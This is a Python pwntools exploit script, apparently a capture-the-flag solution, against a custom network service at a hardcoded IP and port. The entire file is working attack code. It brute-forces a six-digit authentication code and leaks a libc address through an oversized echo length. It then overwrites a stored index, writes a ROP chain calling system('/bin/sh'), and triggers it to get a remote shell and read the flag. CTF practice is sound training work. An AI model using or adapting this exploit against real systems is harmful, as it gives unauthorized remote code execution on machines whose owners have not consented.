import base64
from enum import Enum

from pwn import ELF, ROP, context, p32, p64, remote, u64


FLAG_HEX_ECHO = 0x02

NAME_IDX_OFFSET = 0x44
RIP_OFFSET = 0x1878

LIBC_LEAK_START_IDX = 6_323
LIBC_OFFSET = 0x2A28B

context.arch = "amd64"

P = remote("10.212.173.64", 32_178)


class MsgType(Enum):
    ECHO = 1
    SET_NAME = 2
    AUTH = 4
    SHUTDOWN = 7


def send_packet(msg_type: MsgType, flags: int, body: bytes, seq: int, body_len: int | None = None) -> None:
    if body_len is None:
        body_len = len(body) + 2

    header = ((msg_type.value & 0x07) << 5) | (flags & 0x1F)
    packet = bytes([header, (body_len >> 8) & 0xFF, body_len & 0xFF, (seq >> 8) & 0xFF, seq & 0xFF]) + body
    P.sendline(base64.b64encode(packet))


def leak_libc_base() -> int:
    body = b"A" * 8

    send_packet(MsgType.ECHO, FLAG_HEX_ECHO, body, 0x1111, 0x2000)

    leak = P.recvline().split(b":", 1)[1].strip().decode()
    leak_bytes = bytes.fromhex(leak)
    libc_leak_addr = leak_bytes[LIBC_LEAK_START_IDX : LIBC_LEAK_START_IDX + 8]
    return u64(libc_leak_addr) - LIBC_OFFSET


def bruteforce_auth() -> None:
    for i in range(10_000):
        code = f"{i:06d}".encode()
        print(f"Trying authentication code: {code.decode()}")

        send_packet(MsgType.AUTH, 0, code, 0x2222)

        if b"success" in P.recvline():
            print(f"Authentication successful: {code.decode()}")
            return

    raise ValueError("Failed to bruteforce authentication code")


def main() -> None:
    bruteforce_auth()

    libc = ELF("./libc.so.6", checksec=False)
    libc.address = leak_libc_base()
    system_addr = libc.sym["system"]
    bin_sh_addr = next(libc.search(b"/bin/sh"))

    print(f"libc base: {libc.address:#x}")
    print(f"system: {system_addr:#x}")
    print(f"/bin/sh: {bin_sh_addr:#x}")

    rop = ROP(libc)
    pop_rdi_addr = rop.find_gadget(["pop rdi", "ret"])[0]
    ret_addr = rop.find_gadget(["ret"])[0]

    print(f"pop rdi; ret: {pop_rdi_addr:#x}")
    print(f"ret: {ret_addr:#x}")

    payload = b"A" * NAME_IDX_OFFSET
    payload += p32(RIP_OFFSET)
    send_packet(MsgType.SET_NAME, 0, payload, 0x1337)

    payload = p64(ret_addr)
    payload += p64(pop_rdi_addr)
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)
    send_packet(MsgType.SET_NAME, 0, payload, 0x1338)

    payload = b""
    send_packet(MsgType.SHUTDOWN, 0, payload, 0x4444)

    P.sendline(b"cat flag.txt")

    P.interactive()


if __name__ == "__main__":
    main()
